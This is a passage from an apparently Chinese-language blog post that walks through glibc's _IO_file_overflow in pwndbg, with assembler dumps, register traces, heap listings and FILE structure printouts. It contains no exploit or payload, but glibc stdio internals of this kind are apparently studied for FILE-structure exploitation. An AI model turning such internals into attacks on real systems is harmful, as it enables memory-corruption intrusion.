rbx</span><br><span class="line">   0x00007ffff7c8ce27 &lt;+103&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8ce28 &lt;+104&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c8ce2a &lt;+106&gt;:   ret</span><br><span class="line">   0x00007ffff7c8ce2b &lt;+107&gt;:   nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8ce30 &lt;+112&gt;:   test   rsi,rsi</span><br><span class="line">   0x00007ffff7c8ce33 &lt;+115&gt;:   je     0x7ffff7c8cf58 &lt;_IO_new_file_overflow+408&gt;</span><br><span class="line">   0x00007ffff7c8ce39 &lt;+121&gt;:   mov    rdx,QWORD PTR [rdi+0x8]</span><br><span class="line">   0x00007ffff7c8ce3d &lt;+125&gt;:   test   ah,0x1</span><br><span class="line">   0x00007ffff7c8ce40 &lt;+128&gt;:   jne    0x7ffff7c8cf80 &lt;_IO_new_file_overflow+448&gt;</span><br><span class="line">   0x00007ffff7c8ce46 &lt;+134&gt;:   mov    rsi,QWORD PTR [rbp+0x40]</span><br><span class="line">   0x00007ffff7c8ce4a &lt;+138&gt;:   cmp    rsi,rdx</span><br><span class="line">   0x00007ffff7c8ce4d &lt;+141&gt;:   je     0x7ffff7c8cf20 &lt;_IO_new_file_overflow+352&gt;</span><br><span class="line">   0x00007ffff7c8ce53 &lt;+147&gt;:   mov    rcx,QWORD PTR [rbp+0x10]</span><br><span class="line">   0x00007ffff7c8ce57 &lt;+151&gt;:   mov    QWORD PTR [rbp+0x8],rcx</span><br><span class="line">   0x00007ffff7c8ce5b &lt;+155&gt;:   mov    QWORD PTR [rbp+0x18],rcx</span><br><span class="line">   0x00007ffff7c8ce5f &lt;+159&gt;:   mov    ecx,eax</span><br><span class="line">   0x00007ffff7c8ce61 &lt;+161&gt;:   or     ch,0x8</span><br><span class="line">   0x00007ffff7c8ce64 &lt;+164&gt;:   mov    QWORD PTR [rbp+0x30],rsi</span><br><span class="line">   0x00007ffff7c8ce68 &lt;+168&gt;:   mov    rsi,rdx</span><br><span class="line">   0x00007ffff7c8ce6b &lt;+171&gt;:   mov    DWORD PTR [rbp+0x0],ecx</span><br><span class="line">   0x00007ffff7c8ce6e &lt;+174&gt;:   mov    ecx,DWORD PTR [rbp+0xc0]</span><br><span class="line">   0x00007ffff7c8ce74 &lt;+180&gt;:   mov    QWORD PTR [rbp+0x28],rdx</span><br><span class="line">   0x00007ffff7c8ce78 &lt;+184&gt;:   mov    QWORD PTR [rbp+0x20],rdx</span><br><span class="line">   0x00007ffff7c8ce7c &lt;+188&gt;:   test   ecx,ecx</span><br><span class="line">   0x00007ffff7c8ce7e &lt;+190&gt;:   jg     0x7ffff7c8cded &lt;_IO_new_file_overflow+45&gt;</span><br><span class="line">   0x00007ffff7c8ce84 &lt;+196&gt;:   test   eax,0x202</span><br><span class="line">   0x00007ffff7c8ce89 &lt;+201&gt;:   je     0x7ffff7c8cded &lt;_IO_new_file_overflow+45&gt;</span><br><span class="line">   0x00007ffff7c8ce8f &lt;+207&gt;:   mov    QWORD PTR [rbp+0x30],rdx</span><br><span class="line">   0x00007ffff7c8ce93 &lt;+211&gt;:   cmp    ebx,0xffffffff</span><br><span class="line">   0x00007ffff7c8ce96 &lt;+214&gt;:   jne    0x7ffff7c8cdf6 &lt;_IO_new_file_overflow+54&gt;</span><br><span class="line">   0x00007ffff7c8ce9c &lt;+220&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8ce9d &lt;+221&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8cea0 &lt;+224&gt;:   sub    rdx,rsi</span><br><span class="line">   0x00007ffff7c8cea3 &lt;+227&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8cea4 &lt;+228&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c8cea6 &lt;+230&gt;:   jmp    0x7ffff7c8c930 &lt;_IO_new_do_write&gt;</span><br><span class="line">   0x00007ffff7c8ceab &lt;+235&gt;:   nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8ceb0 &lt;+240&gt;:   mov    rsi,QWORD PTR [rbp+0x20]</span><br><span class="line">   0x00007ffff7c8ceb4 &lt;+244&gt;:   mov    rdx,QWORD PTR [rbp+0x28]</span><br><span class="line">   0x00007ffff7c8ceb8 &lt;+248&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8cebb &lt;+251&gt;:   sub    rdx,rsi</span><br><span class="line">   0x00007ffff7c8cebe &lt;+254&gt;:   call   0x7ffff7c8c930 &lt;_IO_new_do_write&gt;</span><br><span class="line">   0x00007ffff7c8cec3 &lt;+259&gt;:   cmp    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c8cec6 &lt;+262&gt;:   jne    0x7ffff7c8ce23 &lt;_IO_new_file_overflow+99&gt;</span><br><span class="line">   0x00007ffff7c8cecc &lt;+268&gt;:   mov    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c8ced1 &lt;+273&gt;:   jmp    0x7ffff7c8ce26 &lt;_IO_new_file_overflow+102&gt;</span><br><span class="line">   0x00007ffff7c8ced6 &lt;+278&gt;:   cs nop WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8cee0 &lt;+288&gt;:   mov    eax,DWORD PTR [rbp+0xc0]</span><br><span class="line">   0x00007ffff7c8cee6 &lt;+294&gt;:   test   eax,eax</span><br><span class="line">   0x00007ffff7c8cee8 &lt;+296&gt;:   jle    0x7ffff7c8cf40 &lt;_IO_new_file_overflow+384&gt;</span><br><span class="line">   0x00007ffff7c8ceea &lt;+298&gt;:   mov    rax,QWORD PTR [rbp+0xa0]</span><br><span class="line">   0x00007ffff7c8cef1 &lt;+305&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8cef4 &lt;+308&gt;:   mov    rsi,QWORD PTR [rax+0x18]</span><br><span class="line">   0x00007ffff7c8cef8 &lt;+312&gt;:   mov    rdx,QWORD PTR [rax+0x20]</span><br><span class="line">   0x00007ffff7c8cefc &lt;+316&gt;:   sub    rdx,rsi</span><br><span class="line">   0x00007ffff7c8ceff &lt;+319&gt;:   sar    rdx,0x2</span><br><span class="line">   0x00007ffff7c8cf03 &lt;+323&gt;:   call   0x7ffff7c861a0 &lt;__GI__IO_wdo_write&gt;</span><br><span class="line">   0x00007ffff7c8cf08 &lt;+328&gt;:   cmp    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c8cf0b &lt;+331&gt;:   je     0x7ffff7c8cecc &lt;_IO_new_file_overflow+268&gt;</span><br><span class="line">   0x00007ffff7c8cf0d &lt;+333&gt;:   mov    rdx,QWORD PTR [rbp+0x28]</span><br><span class="line">   0x00007ffff7c8cf11 &lt;+337&gt;:   jmp    0x7ffff7c8ce00 &lt;_IO_new_file_overflow+64&gt;</span><br><span class="line">   0x00007ffff7c8cf16 &lt;+342&gt;:   cs nop WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8cf20 &lt;+352&gt;:   mov    rdx,QWORD PTR [rbp+0x38]</span><br><span class="line">   0x00007ffff7c8cf24 &lt;+356&gt;:   movq   xmm0,rdx</span><br><span class="line">   0x00007ffff7c8cf29 &lt;+361&gt;:   mov    rcx,rdx</span><br><span class="line">   0x00007ffff7c8cf2c &lt;+364&gt;:   punpcklqdq xmm0,xmm0</span><br><span class="line">   0x00007ffff7c8cf30 &lt;+368&gt;:   movups XMMWORD PTR [rbp+0x8],xmm0</span><br><span class="line">   0x00007ffff7c8cf34 &lt;+372&gt;:   jmp    0x7ffff7c8ce57 &lt;_IO_new_file_overflow+151&gt;</span><br><span class="line">   0x00007ffff7c8cf39 &lt;+377&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8cf40 &lt;+384&gt;:   sub    rdx,rsi</span><br><span class="line">   0x00007ffff7c8cf43 &lt;+387&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8cf46 &lt;+390&gt;:   call   0x7ffff7c8c930 &lt;_IO_new_do_write&gt;</span><br><span class="line">   0x00007ffff7c8cf4b &lt;+395&gt;:   cmp    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c8cf4e &lt;+398&gt;:   jne    0x7ffff7c8cf0d &lt;_IO_new_file_overflow+333&gt;</span><br><span class="line">   0x00007ffff7c8cf50 &lt;+400&gt;:   jmp    0x7ffff7c8cecc &lt;_IO_new_file_overflow+268&gt;</span><br><span class="line">   0x00007ffff7c8cf55 &lt;+405&gt;:   nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8cf58 &lt;+408&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8cf5b &lt;+411&gt;:   call   0x7ffff7c8dc90 &lt;__GI__IO_doallocbuf&gt;</span><br><span class="line">   0x00007ffff7c8cf60 &lt;+416&gt;:   mov    rdx,QWORD PTR [rbp+0x38]</span><br><span class="line">   0x00007ffff7c8cf64 &lt;+420&gt;:   mov    eax,DWORD PTR [rbp+0x0]</span><br><span class="line">   0x00007ffff7c8cf67 &lt;+423&gt;:   movq   xmm0,rdx</span><br><span class="line">   0x00007ffff7c8cf6c &lt;+428&gt;:   mov    QWORD PTR [rbp+0x18],rdx</span><br><span class="line">   0x00007ffff7c8cf70 &lt;+432&gt;:   punpcklqdq xmm0,xmm0</span><br><span class="line">   0x00007ffff7c8cf74 &lt;+436&gt;:   movups XMMWORD PTR [rbp+0x8],xmm0</span><br><span class="line">   0x00007ffff7c8cf78 &lt;+440&gt;:   jmp    0x7ffff7c8ce3d &lt;_IO_new_file_overflow+125&gt;</span><br><span class="line">   0x00007ffff7c8cf7d &lt;+445&gt;:   nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8cf80 &lt;+448&gt;:   mov    r12,QWORD PTR [rbp+0x10]</span><br><span class="line">   0x00007ffff7c8cf84 &lt;+452&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8cf87 &lt;+455&gt;:   sub    r12,rdx</span><br><span class="line">   0x00007ffff7c8cf8a &lt;+458&gt;:   call   0x7ffff7c8d7c0 &lt;__GI__IO_free_backup_area&gt;</span><br><span class="line">   0x00007ffff7c8cf8f &lt;+463&gt;:   mov    rdx,QWORD PTR [rbp+0x18]</span><br><span class="line">   0x00007ffff7c8cf93 &lt;+467&gt;:   mov    rsi,r12</span><br><span class="line">   0x00007ffff7c8cf96 &lt;+470&gt;:   neg    rsi</span><br><span class="line">   0x00007ffff7c8cf99 &lt;+473&gt;:   mov    rcx,rdx</span><br><span class="line">   0x00007ffff7c8cf9c &lt;+476&gt;:   sub    rcx,QWORD PTR [rbp+0x38]</span><br><span class="line">   0x00007ffff7c8cfa0 &lt;+480&gt;:   mov    rax,rcx</span><br><span class="line">   0x00007ffff7c8cfa3 &lt;+483&gt;:   neg    rax</span><br><span class="line">   0x00007ffff7c8cfa6 &lt;+486&gt;:   cmp    rcx,r12</span><br><span class="line">   0x00007ffff7c8cfa9 &lt;+489&gt;:   cmova  rax,rsi</span><br><span class="line">   0x00007ffff7c8cfad &lt;+493&gt;:   add    rdx,rax</span><br><span class="line">   0x00007ffff7c8cfb0 &lt;+496&gt;:   mov    eax,DWORD PTR [rbp+0x0]</span><br><span class="line">   0x00007ffff7c8cfb3 &lt;+499&gt;:   jmp    0x7ffff7c8ce46 &lt;_IO_new_file_overflow+134&gt;</span><br><span class="line">   0x00007ffff7c8cfb8 &lt;+504&gt;:   nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8cfc0 &lt;+512&gt;:   or     eax,0x20</span><br><span class="line">   0x00007ffff7c8cfc3 &lt;+515&gt;:   mov    DWORD PTR [rdi],eax</span><br><span class="line">   0x00007ffff7c8cfc5 &lt;+517&gt;:   mov    rax,QWORD PTR [rip+0x18ce44]        # 0x7ffff7e19e10</span><br><span class="line">   0x00007ffff7c8cfcc &lt;+524&gt;:   mov    DWORD PTR fs:[rax],0x9</span><br><span class="line">   0x00007ffff7c8cfd3 &lt;+531&gt;:   mov    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c8cfd8 &lt;+536&gt;:   jmp    0x7ffff7c8ce26 &lt;_IO_new_file_overflow+102&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>回到调试<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8cdc0 &lt;_IO_file_overflow&gt;        endbr64</span><br><span class="line">0x7ffff7c8cdc4 &lt;_IO_file_overflow+4&gt;      push   r12</span><br><span class="line">0x7ffff7c8cdc6 &lt;_IO_file_overflow+6&gt;      push   rbp</span><br><span class="line">0x7ffff7c8cdc7 &lt;_IO_file_overflow+7&gt;      mov    rbp, rdi                 RBP =&gt; 0x5555555592a0 ◂— 0xfbad2488</span><br><span class="line">0x7ffff7c8cdca &lt;_IO_file_overflow+10&gt;     push   rbx</span><br><span class="line">0x7ffff7c8cdcb &lt;_IO_file_overflow+11&gt;     mov    eax, dword ptr [rdi]     EAX, [0x5555555592a0] =&gt; 0xfbad2488</span><br><span class="line">0x7ffff7c8cdcd &lt;_IO_file_overflow+13&gt;     test   al, 8                    0x88 &amp; 0x8     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8cdcf &lt;_IO_file_overflow+15&gt;   ✘ jne    _IO_file_overflow+512       &lt;_IO_file_overflow+512&gt;</span><br></pre></td></tr></table></figure><p>这里先保存栈帧，然后检查<code>_flags</code>，判断文件是否可写，（<del>笔者这里demo写的时候忘记改文件打开模式了，所以不可写，直接返回了，改一下后重新快进到这一步</del>）不可写则返回（<code>&lt;_IO_file_overflow+512&gt;</code>后续执行就返回了），可写则继续<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8cdd5 &lt;_IO_file_overflow+21&gt;     mov    ebx, esi                        EBX =&gt; 0xffffffff</span><br><span class="line">0x7ffff7c8cdd7 &lt;_IO_file_overflow+23&gt;     mov    rsi, qword ptr [rdi + 0x20]     RSI, [0x5555555592c0] =&gt; 0</span><br><span class="line">0x7ffff7c8cddb &lt;_IO_file_overflow+27&gt;     test   ah, 8                           0x24 &amp; 0x8     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8cdde &lt;_IO_file_overflow+30&gt;   ✔ je     _IO_file_overflow+112       &lt;_IO_file_overflow+112&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8ce30 &lt;_IO_file_overflow+112&gt;    test   rsi, rsi                        0 &amp; 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8ce33 &lt;_IO_file_overflow+115&gt;  ✔ je     _IO_file_overflow+408       &lt;_IO_file_overflow+408&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8cf58 &lt;_IO_file_overflow+408&gt;    mov    rdi, rbp                        RDI =&gt; 0x5555555592a0 ◂— 0xfbad2484</span><br><span class="line">0x7ffff7c8cf5b &lt;_IO_file_overflow+411&gt;    call   _IO_doallocbuf              &lt;_IO_doallocbuf&gt;</span><br></pre></td></tr></table></figure><p>这里先判断<code>_flags</code>状态，还未准备好写入，然后判断<code>[rdi + 0x20]</code>即<code>_IO_write_base</code>是否为空，为空则调用<code>_IO_doallocbuf</code>来分配缓冲区<br>这里<code>_IO_doallocbuf</code>的流程在fread就分析过了，不再赘述，直接看返回后结构体的状态<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *_IO_list_all</span><br><span class="line">$1 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539004,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_buf_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x1e0 (with flag bits: 0x1e1)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559470</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555594a0</span><br><span class="line">Size: 0x1010 (with flag bits: 0x1011)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555a4b0</span><br><span class="line">Size: 0x1fb50 (with flag bits: 0x1fb51)</span><br></pre></td></tr></table></figure><p>分配好了大小0x1000的chunk作为缓冲区，并设置好了<code>_IO_buf_base</code>和<code>_IO_buf_end</code>指针<br>然后设置了read三元组（<code>_IO_read_base</code>,<code>_IO_read_ptr</code>,<code>_IO_read_end</code>）为<code>_IO_buf_base</code><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8cf60 &lt;_IO_file_overflow+416&gt;    mov    rdx, qword ptr [rbp + 0x38]     RDX, [0x5555555592d8] =&gt; 0x5555555594b0 ◂— 0</span><br><span class="line">0x7ffff7c8cf64 &lt;_IO_file_overflow+420&gt;    mov    eax, dword ptr [rbp]            EAX, [0x5555555592a0] =&gt; 0xfbad2484</span><br><span class="line">0x7ffff7c8cf67 &lt;_IO_file_overflow+423&gt;    movq   xmm0, rdx                       XMM0 =&gt; 0x5555555594b0 ◂— 0</span><br><span class="line">0x7ffff7c8cf6c &lt;_IO_file_overflow+428&gt;    mov    qword ptr [rbp + 0x18], rdx     [0x5555555592b8] &lt;= 0x5555555594b0 ◂— 0</span><br><span class="line">0x7ffff7c8cf70 &lt;_IO_file_overflow+432&gt;    punpcklqdq xmm0, xmm0</span><br><span class="line">0x7ffff7c8cf74 &lt;_IO_file_overflow+436&gt;    movups xmmword ptr [rbp + 8], xmm0</span><br><span class="line">0x7ffff7c8cf78 &lt;_IO_file_overflow+440&gt;    jmp    _IO_file_overflow+125       &lt;_IO_file_overflow+125&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *_IO_list_all</span><br><span class="line">$2 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539004,</span><br><span class="line">    _IO_read_ptr = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_read_end = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_read_base = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_buf_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到都设置为了<code>_IO_buf_base</code><br>后续再判断<code>_flags</code>位<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8ce3d &lt;_IO_file_overflow+125&gt;    test   ah, 1                           0x24 &amp; 0x1     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8ce40 &lt;_IO_file_overflow+128&gt;  ✘ jne    _IO_file_overflow+448       &lt;_IO_file_overflow+448&gt;</span><br></pre></td></tr></table></figure><p>如果是用户提供的缓冲区则跳转到<code>_IO_file_overflow+448</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7c8cf80 &lt;+448&gt;:   mov    r12,QWORD PTR [rbp+0x10]</span><br><span class="line">0x00007ffff7c8cf84 &lt;+452&gt;:   mov    rdi,rbp</span><br><span class="line">0x00007ffff7c8cf87 &lt;+455&gt;:   sub    r12,rdx</span><br><span class="line">0x00007ffff7c8cf8a &lt;+458&gt;:   call   0x7ffff7c8d7c0 &lt;__GI__IO_free_backup_area&gt;</span><br></pre></td></tr></table></figure><p>这里是调用函数清理backup区域。显然这里的缓冲区并不是用户提供的，而是malloc分配的，所以不会跳转<br>后续则是<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8ce46 &lt;_IO_file_overflow+134&gt;    mov    rsi, qword ptr [rbp + 0x40]     RSI, [0x5555555592e0] =&gt; 0x55555555a4b0 ◂— 0</span><br><span class="line">0x7ffff7c8ce4a &lt;_IO_file_overflow+138&gt;    cmp    rsi, rdx                        0x55555555a4b0 - 0x5555555594b0     EFLAGS =&gt; 0x206 [ cf PF af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8ce4d &lt;_IO_file_overflow+141&gt;  ✘ je     _IO_file_overflow+352       &lt;_IO_file_overflow+352&gt;</span><br></pre></td></tr></table></figure><p>验证<code>_IO_buf_end</code>是否等于<code>_IO_buf_base</code>,确保缓冲区的分配<br>接着往下走<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8ce53 &lt;_IO_file_overflow+147&gt;    mov    rcx, qword ptr [rbp + 0x10]     RCX, [0x5555555592b0] =&gt; 0x5555555594b0 ◂— 0</span><br><span class="line">0x7ffff7c8ce57 &lt;_IO_file_overflow+151&gt;    mov    qword ptr [rbp + 8], rcx        [0x5555555592a8] &lt;= 0x5555555594b0 ◂— 0</span><br><span class="line">0x7ffff7c8ce5b &lt;_IO_file_overflow+155&gt;    mov    qword ptr [rbp + 0x18], rcx     [0x5555555592b8] &lt;= 0x5555555594b0 ◂— 0</span><br><span class="line">0x7ffff7c8ce5f &lt;_IO_file_overflow+159&gt;    mov    ecx, eax                        ECX =&gt; 0xfbad2484</span><br><span class="line">0x7ffff7c8ce61 &lt;_IO_file_overflow+161&gt;    or     ch, 8                           CH =&gt; 44 (0x24 | 0x8)</span><br><span class="line">0x7ffff7c8ce64 &lt;_IO_file_overflow+164&gt;    mov    qword ptr [rbp + 0x30], rsi     [0x5555555592d0] &lt;= 0x55555555a4b0 ◂— 0</span><br><span class="line">0x7ffff7c8ce68 &lt;_IO_file_overflow+168&gt;    mov    rsi, rdx                        RSI =&gt; 0x5555555594b0 ◂— 0</span><br></pre></td></tr></table></figure><p>这里<code>rcx</code>是<code>[rbp + 0x10]</code>也就是<code>_IO_read_end</code>，将其赋给<code>_IO_read_ptr</code>和<code>_IO_read_base</code>. <code>rsi</code>是<code>_IO_buf_end</code>，这里也就是把<code>_IO_write_end</code>设置成了<code>_IO_buf_end</code>，<code>rdx</code>是<code>_IO_buf_base</code>，再往下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8ce6b &lt;_IO_file_overflow+171&gt;:   mov    DWORD PTR [rbp+0x0],ecx</span><br><span class="line">0x7ffff7c8ce6e &lt;_IO_file_overflow+174&gt;:   mov    ecx,DWORD PTR [rbp+0xc0]</span><br><span class="line">0x7ffff7c8ce74 &lt;_IO_file_overflow+180&gt;:   mov    QWORD PTR [rbp+0x28],rdx</span><br><span class="line">0x7ffff7c8ce78 &lt;_IO_file_overflow+184&gt;    mov    qword ptr [rbp + 0x20], rdx     [0x5555555592c0] &lt;= 0x5555555594b0 ◂— 0</span><br></pre></td></tr></table></figure><p>这里设置<code>_flags</code>，然后保存<code>_mode</code>到ecx（<code>[rbp+0xc0]</code>即偏移0xc0是<code>_mode</code>域），然后将<code>_IO_write_base</code>和<code>_IO_write_ptr</code>设置为<code>_IO_buf_base</code><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 